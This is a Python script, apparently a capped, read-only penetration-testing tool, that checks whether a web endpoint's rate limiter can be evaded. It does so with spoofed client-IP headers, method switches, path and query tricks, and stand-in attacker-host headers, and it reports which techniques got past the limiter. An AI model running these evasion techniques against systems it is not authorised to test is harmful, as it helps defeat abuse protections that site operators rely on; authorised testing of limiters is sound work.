#!/usr/bin/env python3
"""Rate-limit BYPASS attack tests — does the limiter actually hold?

Each technique gets a few read-only requests (GET/HEAD/OPTIONS only — never
login POSTs, never credential material). A variant BYPASSES the limiter only
if the baseline is 429-limited while the variant keeps getting clean 2xx/3xx
responses — a variant that just 404s/500s is INEFFECTIVE, not a bypass.

Techniques (25): baseline | xff-1..5 | x-real-ip | x-orig-ip | cf-ip |
  x-client-ip | method-head | method-options | trail-slash | query-junk |
  case-path | dbl-slash | dot-seg | xff-host | referer-evil | via-evil |
  accept-json | cookie-junk | cache-bust | ua-mobile | ua-curl

Run:  python3 attack_bypass.py https://target/throttled-endpoint
      python3 attack_bypass.py https://target/ --per-variant 3 --json out.json
      python3 attack_bypass.py https://target/ --dry-run

Run:  python3 attack_bypass.py https://target/throttled-endpoint
      python3 attack_bypass.py https://target/ --per-variant 3 --json out.json
      python3 attack_bypass.py https://target/ --dry-run

#rate-limit-bypass #attack #capped #no-flooding #read-only
"""
import argparse
import json
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from safe_rate_limit_catalog import HEADERS, clamp, ensure_parent, jitter_sleep  # noqa: E402

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAKE_IPS = ["9.9.9.9", "10.11.12.13", "192.0.2.44", "198.51.100.7", "203.0.113.99"]


def verdict_for(baseline_limited, variant_limited, variant_statuses=()):
    """Pure bypass verdict: limiter exists (baseline 429s) AND the variant
    escapes it with clean 2xx/3xx responses. A variant that only errors/404s
    proves nothing — it never reached the limiter logic."""
    if baseline_limited is None:
        return ("SKIPPED: baseline not run (--only excluded it) — "
                "bypass cannot be judged without a baseline")
    if not baseline_limited:
        return "NO-LIMITER: baseline not rate limited — nothing to bypass"
    if variant_limited:
        return "HELD: limiter applies uniformly to this technique"
    if any(isinstance(s, int) and 200 <= s < 400 for s in variant_statuses):
        return "BYPASSED: limiter evaded by this technique (finding!)"
    return ("INEFFECTIVE: variant got no clean 2xx/3xx (errors/redirects only) "
            "— no bypass signal")


def technique_names():
    """Ordered evasion names for menus (dummy URL with path keeps case-path)."""
    return [n for n, _, _, _ in variants_for("https://example.com/somepath")]


def variants_for(url):
    """(name, method, url, headers) — all read-only. See technique_names()."""
    base = dict(HEADERS)
    yield "baseline", "GET", url, dict(base)
    for i, ip in enumerate(FAKE_IPS):
        h = dict(base)
        h["X-Forwarded-For"] = ip
        yield f"xff-{i + 1}", "GET", url, h
    for name, hdr in (("x-real-ip", "X-Real-IP"),
                      ("x-orig-ip", "X-Originating-IP"),
                      ("x-client-ip", "X-Client-IP"),
                      ("cf-ip", "CF-Connecting-IP")):
        h = dict(base)
        h[hdr] = FAKE_IPS[0]
        yield name, "GET", url, h
    yield "method-head", "HEAD", url, dict(base)
    yield "method-options", "OPTIONS", url, dict(base)
    yield "trail-slash", "GET", url.rstrip("/") + "/", dict(base)
    yield "query-junk", "GET", url + ("&" if "?" in url else "?") + "rlb=1", dict(base)
    parts = url.rstrip("/").rsplit("/", 1)
    if len(parts) == 2 and parts[1]:
        yield "case-path", "GET", parts[0] + "/" + parts[1].swapcase(), dict(base)
    yield "dbl-slash", "GET", url.rstrip("/") + "//", dict(base)
    yield "dot-seg", "GET", url.rstrip("/") + "/./", dict(base)
    h = dict(base)
    h["X-Forwarded-Host"] = "evil-attacker.example"
    yield "xff-host", "GET", url, h
    h = dict(base, Referer="https://evil-attacker.example/")
    yield "referer-evil", "GET", url, h
    h = dict(base, Via="1.1 evil-attacker.example")
    yield "via-evil", "GET", url, h
    h = dict(base, Accept="application/json")
    yield "accept-json", "GET", url, h
    h = dict(base, Cookie="rlbypass=1")
    yield "cookie-junk", "GET", url, h
    yield ("cache-bust", "GET",
           url + ("&" if "?" in url else "?") + "cachebust=rlbypass", dict(base))
    h = dict(base)
    h["User-Agent"] = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
                       "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 "
                       "Mobile/15E148 Safari/604.1")
    yield "ua-mobile", "GET", url, h
    h = dict(base)
    h["User-Agent"] = "curl/8.5.0"
    yield "ua-curl", "GET", url, h


def run_variant(name, method, url, headers, n, delay, rng):
    statuses = []
    for i in range(n):
        try:
            r = requests.request(method, url, headers=headers, timeout=5, verify=False)
            statuses.append(r.status_code)
        except Exception as e:
            statuses.append(f"ERR:{type(e).__name__}")
        print(f"  [{name}] {i + 1}/{n} -> {statuses[-1]}", flush=True)
        jitter_sleep(delay, rng)
    limited = any(s == 429 for s in statuses)
    return {"variant": name, "method": method, "statuses": statuses,
            "limited": limited}


def main():
    ap = argparse.ArgumentParser(description="Rate-limit bypass attack tests (capped)")
    ap.add_argument("url", help="endpoint known/suspected to rate limit (429s)")
    ap.add_argument("--per-variant", type=int, default=3,
                    help="requests per technique (cap 50)")
    ap.add_argument("--delay", type=float, default=1.0, help="delay seconds (min 0.5)")
    ap.add_argument("--only", default="",
                    help="comma list to run a subset, e.g. baseline,xff-1,method-head")
    ap.add_argument("--dry-run", action="store_true", help="list techniques, send nothing")
    ap.add_argument("--json", default="", help="write results JSON here")
    args = ap.parse_args()

    per_variant, delay, _ = clamp(min(args.per_variant, 50), args.delay, 1)
    only = {v.strip() for v in args.only.split(",") if v.strip()} or None
    techs = [(n, m, u, h) for n, m, u, h in variants_for(args.url)
             if only is None or n in only or (n.startswith("xff-") and "xff" in (only or set()))]
    print(f"Bypass attack — {args.url} — {len(techs)} techniques x{per_variant} "
          f"@ >={delay}s (read-only, no logins)")
    if args.dry_run:
        for n, m, u, _ in techs:
            print(f"  PLAN {n}: {m} {u} x{per_variant}")
        return 0

    rng = random.Random()
    results = [run_variant(n, m, u, h, per_variant, delay, rng) for n, m, u, h in techs]
    base_rows = [r["limited"] for r in results if r["variant"] == "baseline"]
    baseline_limited = base_rows[0] if base_rows else None
    print("\n=== BYPASS VERDICTS ===")
    bypassed = []
    for r in results:
        v = verdict_for(baseline_limited, r["limited"], r["statuses"])
        r["verdict"] = v
        print(f"{r['variant']:<16} {str(r['statuses']):<40} {v}")
        if v.startswith("BYPASSED"):
            bypassed.append(r["variant"])
    if bypassed:
        print(f"\nFINDING: rate limit bypassed via: {bypassed}")
    out = {"target": args.url, "baseline_limited": baseline_limited,
           "bypassed": bypassed, "results": results}
    if args.json:
        ensure_parent(args.json)
        with open(args.json, "w") as f:
            json.dump(out, f, indent=2, default=str)
        print(f"Evidence written: {args.json}")


if __name__ == "__main__":
    sys.exit(main())
